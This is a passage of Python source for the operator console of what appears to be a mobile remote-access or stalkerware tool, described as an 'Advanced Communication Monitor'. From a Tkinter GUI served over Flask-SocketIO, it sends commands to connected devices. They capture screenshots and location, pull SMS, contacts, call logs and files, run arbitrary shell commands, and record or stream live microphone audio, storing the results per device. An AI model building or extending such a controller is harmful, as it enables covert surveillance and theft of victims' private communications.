            )

            if live_sid:
                self.current_selected_live_client_sid = live_sid
                self._enable_commands(True)
                is_streaming = stream_active_for_device.get(live_sid, False)
                self.live_audio_status_var.set(
                    "Live Audio: Receiving..." if is_streaming else "Live Audio: Idle"
                )

                if SOUNDDEVICE_AVAILABLE:
                    self.start_live_audio_button.config(
                        state=tk.DISABLED if is_streaming else tk.NORMAL
                    )
                    self.stop_live_audio_button.config(
                        state=tk.NORMAL if is_streaming else tk.DISABLED
                    )
            else:
                self.current_selected_live_client_sid = None
                self._enable_commands(False)

            # تمييز العنصر المحدد
            self.historical_devices_listbox.selection_clear(0, tk.END)
            for i, device_id in enumerate(
                self.historical_devices_manager.items_in_listbox
            ):
                if device_id == selected_device_id:
                    self.historical_devices_listbox.selection_set(i)
                    break
        else:
            self.current_selected_historical_device_id = None
            if not self.current_selected_live_client_sid:
                self._enable_commands(False)

    # --- Device Details Display ---
    def display_device_details(self, device_id):
        """عرض تفاصيل الجهاز"""
        self.details_text.config(state=tk.NORMAL)
        self.details_text.delete("1.0", tk.END)

        # Device header
        self.details_text.insert(tk.END, f"{'='*60}\n")
        self.details_text.insert(tk.END, f"📱 MONITOR DETAILS: {device_id}\n")
        self.details_text.insert(tk.END, f"{'='*60}\n\n")

        # Basic info
        tag = device_manager.get_tag(device_id)
        self.details_text.insert(tk.END, f"🏷️  Tag: {tag if tag else '(No tag set)'}\n")

        # Connection status
        is_online = any(
            info.get("id") == device_id for info in connected_clients_sio.values()
        )
        status = "🟢 ONLINE" if is_online else "🔴 OFFLINE"
        self.details_text.insert(tk.END, f"📡 Status: {status}\n")

        if is_online:
            live_info = next(
                (
                    info
                    for info in connected_clients_sio.values()
                    if info.get("id") == device_id
                ),
                {},
            )
            if live_info:
                self.details_text.insert(
                    tk.END, f"🌐 IP Address: {live_info.get('ip', 'N/A')}\n"
                )
                self.details_text.insert(
                    tk.END, f"💻 Platform: {live_info.get('platform', 'Unknown')}\n"
                )
                self.details_text.insert(
                    tk.END,
                    f"⚡ Capabilities: {', '.join(live_info.get('capabilities', ['basic']))}\n",
                )

        self.details_text.insert(tk.END, f"\n{'='*60}\n")
        self.details_text.insert(tk.END, f"📂 DATA FILES & ANALYSIS RESULTS\n")
        self.details_text.insert(tk.END, f"{'='*60}\n\n")

        device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
        try:
            if os.path.isdir(device_folder):
                self._display_folder_contents(device_folder, "")

                # Add a button at the end to open file browser
                self.details_text.insert(tk.END, f"\n\n{'='*60}\n")
                self.details_text.insert(
                    tk.END,
                    "📂 Click 'Browse Files' in the File Operations tab to navigate files\n",
                )
            else:
                self.details_text.insert(tk.END, "❌ Device data folder not found\n")
        except Exception as e:
            self.details_text.insert(tk.END, f"❌ Error listing files: {e}\n")
            logger.error(f"Error listing files for {device_id}: {e}", exc_info=True)

        self.details_text.config(state=tk.DISABLED)

    def _display_folder_contents(self, folder_path, prefix=""):
        """عرض محتويات المجلد بشكل هرمي"""
        try:
            items = sorted(os.listdir(folder_path))

            # Subdirectories first
            for item in items:
                item_path = os.path.join(folder_path, item)
                if os.path.isdir(item_path):
                    self.details_text.insert(tk.END, f"{prefix}📁 {item}/\n")

                    sub_items = sorted(os.listdir(item_path))
                    for sub_item in sub_items[:10]:  # First 10 files only
                        sub_item_path = os.path.join(item_path, sub_item)
                        if os.path.isfile(sub_item_path):
                            try:
                                stat_result = os.stat(sub_item_path)
                                size_kb = stat_result.st_size / 1024
                                mod_time = datetime.datetime.fromtimestamp(
                                    stat_result.st_mtime
                                ).strftime("%Y-%m-%d %H:%M")
                                file_icon = Utils.get_file_icon(sub_item)
                                self.details_text.insert(
                                    tk.END,
                                    f"{prefix}  {file_icon} {sub_item} ({size_kb:.1f} KB) - {mod_time}\n",
                                )
                            except Exception:
                                self.details_text.insert(
                                    tk.END,
                                    f"{prefix}  📄 {sub_item} (Error reading file info)\n",
                                )

                    if len(sub_items) > 10:
                        self.details_text.insert(
                            tk.END,
                            f"{prefix}  ... and {len(sub_items)-10} more files\n",
                        )
                    self.details_text.insert(tk.END, "\n")

            # Files in main directory
            files_shown = 0
            for item in items:
                item_path = os.path.join(folder_path, item)
                if os.path.isfile(item_path):
                    try:
                        stat_result = os.stat(item_path)
                        size_kb = stat_result.st_size / 1024
                        mod_time = datetime.datetime.fromtimestamp(
                            stat_result.st_mtime
                        ).strftime("%Y-%m-%d %H:%M")
                        file_icon = Utils.get_file_icon(item)
                        self.details_text.insert(
                            tk.END,
                            f"{prefix}{file_icon} {item} ({size_kb:.1f} KB) - {mod_time}\n",
                        )
                        files_shown += 1
                    except Exception:
                        self.details_text.insert(
                            tk.END, f"{prefix}📄 {item} (Error reading file info)\n"
                        )

            if files_shown == 0 and not any(
                os.path.isdir(os.path.join(folder_path, item)) for item in items
            ):
                self.details_text.insert(tk.END, f"{prefix}📭 No files found\n")

        except Exception as e:
            self.details_text.insert(tk.END, f"{prefix}❌ Error reading folder: {e}\n")

    # --- Command Enable/Disable ---
    def _enable_commands(self, enable=True):
        """تمكين أو تعطيل الأوامر"""
        state = tk.NORMAL if enable else tk.DISABLED

        # تفعيل/تعطيل جميع أزرار الأوامر
        try:
            for button in self.command_buttons.values():
                button.config(state=state)

            self.record_audio_button.config(state=state)

            # أزرار البث الصوتي المباشر
            if SOUNDDEVICE_AVAILABLE:
                is_streaming = stream_active_for_device.get(
                    self.current_selected_live_client_sid, False
                )
                self.start_live_audio_button.config(
                    state=tk.DISABLED if (not enable or is_streaming) else tk.NORMAL
                )
                self.stop_live_audio_button.config(
                    state=tk.NORMAL if (enable and is_streaming) else tk.DISABLED
                )
            else:
                self.start_live_audio_button.config(state=tk.DISABLED)
                self.stop_live_audio_button.config(state=tk.DISABLED)

            # تحديث حالة البث الصوتي المباشر
            if not enable:
                self.live_audio_status_var.set("Live Audio: Idle (No Monitor Selected)")
                if not SOUNDDEVICE_AVAILABLE:
                    self.live_audio_status_var.set(
                        "Live Audio: Disabled (Missing Libraries)"
                    )

            # إضافة تأكيد مرئي بأن الأوامر تم تفعيلها
            if enable:
                self.add_system_log("تم تفعيل جميع الأوامر للجهاز المحدد", "info")

            # التأكد من تحديث واجهة المستخدم فوراً
            self.master.update()
        except Exception as e:
            # إذا حدث خطأ، سجله ولكن لا تفشل
            logger.error(f"Error in _enable_commands: {e}", exc_info=True)
            self.add_system_log(f"خطأ أثناء تفعيل الأوامر: {e}", "error")

    def _get_target_id(self):
        """الحصول على معرف الهدف للأوامر"""
        if self.current_selected_live_client_sid:
            return self.current_selected_live_client_sid
        elif self.current_selected_historical_device_id:
            live_sid = next(
                (
                    s
                    for s, i in connected_clients_sio.items()
                    if i.get("id") == self.current_selected_historical_device_id
                ),
                None,
            )
            if live_sid:
                self.current_selected_live_client_sid = live_sid

                # تأكيد بصري لاختيار الجهاز
                self._ensure_selection_active()
                self._enable_commands(True)

                return live_sid
            else:
                messagebox.showerror(
                    "Error",
                    f"Monitor '{self.current_selected_historical_device_id}' is not currently live.",
                    parent=self.master,
                )
                return None
        else:
            # التحقق إذا كان هناك أي جهاز متصل متاح
            if connected_clients_sio:
                # اختيار أول جهاز متصل تلقائياً
                first_sid, first_info = next(iter(connected_clients_sio.items()))
                self.current_selected_live_client_sid = first_sid
                selected_device_id = first_info.get("id", "Unknown ID")

                self.add_system_log(
                    f"Auto-selected live monitor: {selected_device_id} (SID: {first_sid})"
                )

                # تحديث واجهة المستخدم للإشارة إلى الجهاز المحدد
                self._ensure_selection_active()
                self._enable_commands(True)
                self.display_device_details(selected_device_id)

                # إخطار المستخدم
                self.add_system_log("تم اختيار الجهاز الأول تلقائياً")

                return first_sid
            else:
                messagebox.showerror(
                    "Error", "No monitor selected or available.", parent=self.master
                )
                return None

    # --- File Browser Commands ---
    def open_file_browser(self):
        """Open the file browser window"""
        # Get the currently selected device
        device_id = None
        target_id = None

        if self.current_selected_historical_device_id:
            device_id = self.current_selected_historical_device_id

            # Check if device is online
            target_id = next(
                (
                    s
                    for s, i in connected_clients_sio.items()
                    if i.get("id") == device_id
                ),
                None,
            )

            if not target_id:
                messagebox.showinfo(
                    "Offline Monitor",
                    f"Monitor '{device_id}' is not currently online. File browsing requires an active connection.",
                    parent=self.master,
                )
                return
        elif self.current_selected_live_client_sid:
            # إذا كان لدينا عميل حي محدد مباشرة
            sid = self.current_selected_live_client_sid
            info = connected_clients_sio.get(sid, {})
            device_id = info.get("id", "Unknown")
            target_id = sid
        elif connected_clients_sio:
            # اختيار أول جهاز متصل تلقائياً
            first_sid, first_info = next(iter(connected_clients_sio.items()))
            self.current_selected_live_client_sid = first_sid
            device_id = first_info.get("id", "Unknown ID")
            target_id = first_sid

            self.add_system_log(
                f"Auto-selected live monitor for file browsing: {device_id} (SID: {first_sid})"
            )

            # تحديث واجهة المستخدم للإشارة إلى الجهاز المحدد
            self._ensure_selection_active()
            self._enable_commands(True)
            self.display_device_details(device_id)
        else:
            messagebox.showinfo(
                "Select Monitor",
                "No connected monitors available. Please wait for a monitor to connect.",
                parent=self.master,
            )
            return

        # Close existing file browser if open
        if hasattr(self, "file_browser") and self.file_browser:
            try:
                self.file_browser.close()
            except:
                pass

        # Create new file browser window
        self.file_browser = FileBrowserWindow(self.master, device_id, target_id, self)
        self.add_system_log(f"Opened file browser for monitor: {device_id}")

    # --- Command Implementations ---
    def take_screenshot(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_TAKE_SCREENSHOT)

    def list_files(self):
        target_id = self._get_target_id()
        if target_id:
            dir_path = simpledialog.askstring(
                "List Files",
                "Enter directory path (e.g., /sdcard/Download):",
                parent=self.master,
            )
            if dir_path:
                send_command_to_client(
                    target_id, Commands.SIO_CMD_LIST_FILES, args={"path": dir_path}
                )

    def get_location(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_GET_LOCATION)

    def upload_specific_file(self):
        target_id = self._get_target_id()
        if target_id:
            file_path = simpledialog.askstring(
                "Upload File",
                "Enter the full path of the file to upload on the monitor:",
                parent=self.master,
            )
            if file_path:
                send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
                    args={"path": file_path},
                )

    def execute_shell_command(self):
        target_id = self._get_target_id()
        if target_id:
            shell_cmd = simpledialog.askstring(
                "Execute System Command",
                "Enter the system command to execute:",
                parent=self.master,
            )
            if shell_cmd:
                send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_EXECUTE_SHELL,
                    args={"command": shell_cmd},
                )

    def get_sms_list(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_GET_SMS_LIST)

    def get_social_network_data(self):
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log("Initiating advanced social network analysis...")
            send_command_to_client(target_id, Commands.SIO_CMD_GET_SOCIAL_NETWORK)

    def get_communication_history(self):
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log(
                "Initiating comprehensive communication history extraction..."
            )
            send_command_to_client(
                target_id, Commands.SIO_CMD_GET_COMMUNICATION_HISTORY
            )

    def get_contacts_list(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_GET_CONTACTS_LIST)

    def get_call_logs(self):
        target_id = self._get_target_id()
        if target_id:
            send_command_to_client(target_id, Commands.SIO_CMD_GET_CALL_LOGS)

    def catalog_library_content(self):
        """فهرسة محتوى المكتبة"""
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log("Initiating intelligent library cataloging...")
            send_command_to_client(target_id, Commands.SIO_CMD_CATALOG_LIBRARY)

    def analyze_specific_content(self):
        """تحليل محتوى محدد"""
        target_id = self._get_target_id()
        if target_id:
            # If file browser is open, suggest using it
            if hasattr(self, "file_browser") and self.file_browser:
                user_response = messagebox.askyesno(
                    "Use File Browser",
                    "The File Browser is open. Would you like to select a file there instead?",
                    parent=self.master,
                )
                if user_response:
                    self.file_browser.window.lift()
                    self.file_browser.window.focus_set()
                    return

            # Otherwise prompt for path
            file_path = simpledialog.askstring(
                "Content Analysis",
                "Enter the full path of the content to analyze:",
                parent=self.master,
            )
            if file_path:
                self.add_system_log(f"Analyzing content: {file_path}")
                send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_ANALYZE_CONTENT,
                    args={"filePath": file_path},
                )
            else:
                self.add_system_log("Content analysis cancelled", level="warning")

    def process_content_queue(self):
        """معالجة طابور المحتوى"""
        target_id = self._get_target_id()
        if target_id:
            self.add_system_log("Processing intelligent content queue...")
            send_command_to_client(target_id, Commands.SIO_CMD_PROCESS_QUEUE)

    def record_audio_fixed(self):
        target_id = self._get_target_id()
        if target_id:
            duration = simpledialog.askinteger(
                "Audio Recording",
                "Enter recording duration in seconds:",
                parent=self.master,
                minvalue=1,
                maxvalue=300,
            )
            if duration:
                send_command_to_client(
                    target_id,
                    Commands.SIO_CMD_RECORD_AUDIO_FIXED,
                    args={"duration": duration},
                )

    def start_live_audio(self):
        if not SOUNDDEVICE_AVAILABLE:
            messagebox.showerror(
                "Error", "Sounddevice library not available.", parent=self.master
            )
            return

        target_id = self._get_target_id()
        if not target_id:
            return

        device_info = connected_clients_sio.get(target_id, {})
        device_id_for_log = device_info.get("id", target_id)

        logger.info(f"Starting live audio for monitor: {device_id_for_log}")
        self.live_audio_status_var.set(
            f"Live Audio: Starting for {device_id_for_log}..."
        )
        self.start_live_audio_button.config(state=tk.DISABLED)
        self.stop_live_audio_button.config(state=tk.NORMAL)

        self.start_playback_thread()

        result = send_command_to_client(target_id, Commands.SIO_CMD_START_LIVE_AUDIO)
        if result.get("status") == "sent":
            stream_active_for_device[target_id] = True
            live_audio_buffers[target_id] = {
                "params": {
                    "samplerate": AppConfig.REC_SAMPLERATE,
                    "channels": AppConfig.REC_CHANNELS,
                    "sampwidth": AppConfig.REC_SAMPWIDTH,
                },
                "data": [],
            }
            logger.info(f"Initialized live audio buffer for monitor SID: {target_id}")
            self.add_system_log(f"Start live audio command sent to {device_id_for_log}")
        else:
            self.live_audio_status_var.set("Live Audio: Start Failed")
            self.start_live_audio_button.config(state=tk.NORMAL)
            self.stop_live_audio_button.config(state=tk.DISABLED)

    def stop_live_audio(self):
        if not SOUNDDEVICE_AVAILABLE:
            messagebox.showerror(
                "Error", "Sounddevice library not available.", parent=self.master
            )
            return

        target_id = self._get_target_id()
        if not target_id:
            self.live_audio_status_var.set("Live Audio: Idle")
            self.start_live_audio_button.config(state=tk.DISABLED)
            self.stop_live_audio_button.config(state=tk.DISABLED)
            return

        device_info = connected_clients_sio.get(target_id, {})
        device_id_for_log = device_info.get("id", target_id)

        logger.info(f"Stopping live audio for monitor: {device_id_for_log}")
        self.live_audio_status_var.set(
            f"Live Audio: Stopping for {device_id_for_log}..."
        )

        send_command_to_client(target_id, Commands.SIO_CMD_STOP_LIVE_AUDIO)
        stream_active_for_device.pop(target_id, None)

        self.live_audio_status_var.set("Live Audio: Idle")
        self.start_live_audio_button.config(state=tk.NORMAL)
        self.stop_live_audio_button.config(state=tk.DISABLED)
        self.add_system_log(f"Stop live audio command sent to {device_id_for_log}")

        # Ask about saving recording
        if target_id in live_audio_buffers:
            buffered_stream_info = live_audio_buffers.pop(target_id)
            audio_data_list = buffered_stream_info["data"]
            audio_params = buffered_stream_info["params"]

            if audio_data_list:
                user_choice = messagebox.askyesno(
                    "Save Live Recording",
                    f"Live audio stream from monitor '{device_id_for_log}' has ended.\n"
                    f"Do you want to save the recording?",
                    parent=self.master,
                )
                if user_choice:
                    self._save_recorded_stream(
                        device_id_for_log, target_id, audio_data_list, audio_params
                    )

    def _save_recorded_stream(
        self, device_id_str, client_sid, audio_data_list, audio_params
    ):
        """حفظ البث المسجل إلى ملف WAV"""
        if not audio_data_list:
            self.add_system_log(
                f"No audio data to save for monitor {device_id_str}", level="warning"
            )
            return

        try:
            device_id_sanitized = Utils.sanitize_device_id(device_id_str)
            recordings_dir = os.path.join(
                AppConfig.DATA_RECEIVED_DIR, device_id_sanitized, "live_recordings"
            )
            os.makedirs(recordings_dir, exist_ok=True)

            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = f"live_rec_{device_id_sanitized}_{timestamp}.wav"
            filepath = os.path.join(recordings_dir, filename)

            combined_audio_data = b"".join(audio_data_list)

            with wave.open(filepath, "wb") as wf:
                wf.setnchannels(audio_params["channels"])
                wf.setsampwidth(audio_params["sampwidth"])
                wf.setframerate(audio_params["samplerate"])
                wf.writeframes(combined_audio_data)

            log_msg = f"Live audio recording saved for monitor {device_id_str} to: {filepath} ({len(combined_audio_data)/1024:.2f} KB)"
            self.add_system_log(log_msg, level="success")
            logger.info(log_msg)

            messagebox.showinfo(
                "Recording Saved",
                f"Live audio recording saved to:\n{filepath}",
                parent=self.master,
            )

            # Update file list
            if self.current_selected_historical_device_id == device_id_sanitized:
                self.display_device_details(device_id_sanitized)

        except Exception as e:
            err_msg = f"Error saving live audio stream for monitor {device_id_str}: {e}"
            logger.error(err_msg, exc_info=True)
            messagebox.showerror(
                "Save Error",
                f"Failed to save live audio recording: {e}",
                parent=self.master,
            )
            self.add_system_log(
                f"Failed to save live recording for {device_id_str}: {e}", level="error"
            )

    # --- Audio Playback System ---
    def audio_callback(self, outdata, frames, time, status):
        """callback للتشغيل الصوتي"""
        if status:
            logger.warning(f"Audio playback status: {status}")
        try:
            data_list = []
            total_bytes = 0
            target_bytes = outdata.nbytes

            while total_bytes < target_bytes:
                chunk = audio_queue.get_nowait()
                data_list.append(np.frombuffer(chunk, dtype=np.int16))
                total_bytes += len(chunk)
                if total_bytes >= target_bytes:
                    break

            combined_data = np.concatenate(data_list)
            available_frames = len(combined_data)

            if available_frames >= frames:
                outdata[:] = combined_data[:frames].reshape(outdata.shape)
                if available_frames > frames:
                    remaining_data = combined_data[frames:].tobytes()
                    temp_queue = queue.Queue()
                    temp_queue.put(remaining_data)
                    while not audio_queue.empty():
                        try:
                            temp_queue.put(audio_queue.get_nowait())
                        except queue.Empty:
                            break
                    while not temp_queue.empty():
                        try:
                            audio_queue.put(temp_queue.get_nowait())
                        except queue.Empty:
                            break
            else:
                outdata.fill(0)

        except queue.Empty:
            outdata.fill(0)
        except Exception as e:
            logger.error(f"Error in audio callback: {e}", exc_info=True)
            outdata.fill(0)

    def run_playback(self):
        """تشغيل نظام التشغيل الصوتي"""
        global playback_thread
        stream = None
        try:
            logger.info(f"Starting audio playback stream")
            stream = sd.OutputStream(
                samplerate=AppConfig.REC_SAMPLERATE,
                channels=AppConfig.REC_CHANNELS,
                dtype="int16",
                callback=self.audio_callback,
            )
            with stream:
                logger.info("Audio playback stream started")
                while (
                    playback_thread is not None
                    and playback_thread.is_alive()
                    and stream.active
                ):
                    sd.sleep(100)
            logger.info("Audio playback stream finished")
        except sd.PortAudioError as pae:
            logger.error(f"PortAudioError during playback: {pae}", exc_info=True)
            if self.master.winfo_exists():
                messagebox.showerror(
                    "Audio Error",
                    f"Could not open audio output device: {pae}\n\nLive audio playback will not work.",
                    parent=self.master,
                )
        except Exception as e:
            logger.error(f"Error in audio playback thread: {e}", exc_info=True)
        finally:
            logger.info("Playback thread finishing")
            if stream is not None and not stream.closed:
                try:
                    stream.close()
                except Exception as e_close:
                    logger.error(f"Error closing audio stream: {e_close}")
            playback_thread = None

    def start_playback_thread(self):
        """بدء thread التشغيل الصوتي"""
        global playback_thread
        if not SOUNDDEVICE_AVAILABLE:
            logger.warning("Cannot start playback thread: sounddevice not available")
            return

        if playback_thread is None or not playback_thread.is_alive():
            while not audio_queue.empty():
                try:
                    audio_queue.get_nowait()
                except queue.Empty:
                    break
            logger.info("Starting audio playback thread")
            playback_thread = threading.Thread(target=self.run_playback, daemon=True)
            playback_thread.start()
        else:
            logger.info("Playback thread already running")

    # --- Menu Functions ---
    def _export_device_data(self):
        """تصدير بيانات الجهاز"""
        if not self.current_selected_historical_device_id:
            messagebox.showerror(
                "Error", "Please select a device first.", parent=self.master
            )
            return
        # TODO: Implement export logic

    def _import_settings(self):
        """استيراد الإعدادات"""
        # TODO: Implement import logic
        pass

    def _clear_all_data(self):
        """مسح جميع البيانات"""
        confirm = messagebox.askyesno(
            "Confirm",
            "Are you sure you want to delete ALL device data?\nThis action cannot be undone!",
            parent=self.master,
        )
        if confirm:
            try:
                import shutil

                shutil.rmtree(AppConfig.DATA_RECEIVED_DIR)
                os.makedirs(AppConfig.DATA_RECEIVED_DIR, exist_ok=True)
                self.refresh_historical_device_list()
                self.add_system_log("All device data cleared", level="warning")
            except Exception as e:
                messagebox.showerror(
                    "Error", f"Failed to clear data: {e}", parent=self.master
                )

    def _show_server_status(self):
        """عرض حالة الخادم"""
        status_info = f"""
Server Status Report
{'='*40}

📡 Connected Monitors: {len(connected_clients_sio)}
🎵 Active Audio Streams: {len([sid for sid, active in stream_active_for_device.items() if active])}
💾 Data Directory: {AppConfig.DATA_RECEIVED_DIR}
🎵 Audio Support: {'✅' if SOUNDDEVICE_AVAILABLE else '❌'}
🖼️ Image Support: {'✅' if PIL_AVAILABLE else '❌'}

Live Connections:
{chr(10).join([f"• {info.get('name_display', 'Unknown')} ({info.get('id', 'No ID')}) from {info.get('ip', 'Unknown IP')}" 
               for info in connected_clients_sio.values()])}
        """
        messagebox.showinfo("Server Status", status_info, parent=self.master)

    def _show_about(self):
        """عرض معلومات البرنامج"""
        about_text = """
Advanced Communication Monitor Control Panel
Version 2.0

Developed for professional monitoring and analysis
Features advanced social network analysis and 
communication pattern recognition.

🚀 Features:
• Real-time device monitoring
• Advanced contact analysis
• Communication history tracking
• Live audio streaming
• Comprehensive reporting
• Multi-device management
• Tree-based file browsing

⚡ Technical Stack:
• Python Flask & SocketIO
• Tkinter GUI
• SQLite Database
• Audio Processing
• JSON Data Exchange

© 2024 - Advanced Monitoring Solutions
        """
        messagebox.showinfo("About", about_text, parent=self.master)

    def _tag_device(self):
        """وضع علامة على الجهاز"""
        if not self.current_selected_historical_device_id:
            messagebox.showerror(
                "Error", "Please select a device first.", parent=self.master
            )
            return

        current_tag = device_manager.get_tag(self.current_selected_historical_device_id)
        new_tag = simpledialog.askstring(
            "Tag Device",
            f"Enter tag for device '{self.current_selected_historical_device_id}':",
            initialvalue=current_tag,
            parent=self.master,
        )
        if new_tag is not None:
            device_manager.set_tag(self.current_selected_historical_device_id, new_tag)
            self.refresh_historical_device_list()
            self.add_system_log(
                f"Tagged device {self.current_selected_historical_device_id}: {new_tag}"
            )

    def _delete_device_data(self):
        """حذف بيانات الجهاز"""
        if not self.current_selected_historical_device_id:
            messagebox.showerror(
                "Error", "Please select a device first.", parent=self.master
            )
            return

        confirm = messagebox.askyesno(
            "Confirm Delete",
            f"Are you sure you want to delete all data for device '{self.current_selected_historical_device_id}'?\n\nThis action cannot be undone!",
            parent=self.master,
        )
        if confirm:
            try:
                import shutil

                device_folder = os.path.join(
                    AppConfig.DATA_RECEIVED_DIR,
                    self.current_selected_historical_device_id,
                )
                if os.path.exists(device_folder):
                    shutil.rmtree(device_folder)
                device_manager.set_tag(self.current_selected_historical_device_id, "")
                self.refresh_historical_device_list()
                self.add_system_log(
                    f"Deleted all data for device {self.current_selected_historical_device_id}",
                    level="warning",
                )

                # Clear selection
                self.current_selected_historical_device_id = None
                self.details_text.config(state=tk.NORMAL)
                self.details_text.delete("1.0", tk.END)
                self.details_text.insert(
                    tk.END,
                    "Device data deleted. Select another device to view details.",
                )
                self.details_text.config(state=tk.DISABLED)

            except Exception as e:
                messagebox.showerror(
                    "Error", f"Failed to delete device data: {e}", parent=self.master
                )


# --- Main Execution Block ---
if __name__ == "__main__":
    try:
        # بدء خادم Flask في thread منفصل
        flask_thread = threading.Thread(
            target=lambda: socketio.run(
                app,
                host="0.0.0.0",
                port=5000,
                use_reloader=False,
                debug=False,
                allow_unsafe_werkzeug=True,
            ),
            daemon=True,
        )
        flask_thread.start()
        logger.info("🚀 Flask-SocketIO server starting on port 5000...")

        # إنشاء وتشغيل الواجهة الرسومية
        root = tk.Tk()
        gui_app = AdvancedControlPanelApp(root)

        # تشغيل الواجهة
        logger.info("🖥️ Starting GUI application...")
        root.mainloop()

        # إنهاء التطبيق
        logger.info("GUI closed. Saving settings and exiting...")
        device_manager.save_device_tags()

    except KeyboardInterrupt:
        logger.info("Application interrupted by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        if "gui_app" in locals() and gui_app.master.winfo_exists():
            messagebox.showerror("Fatal Error", f"Application error: {e}")
    finally:
        logger.info("Application shutdown complete")
        sys.exit(0)
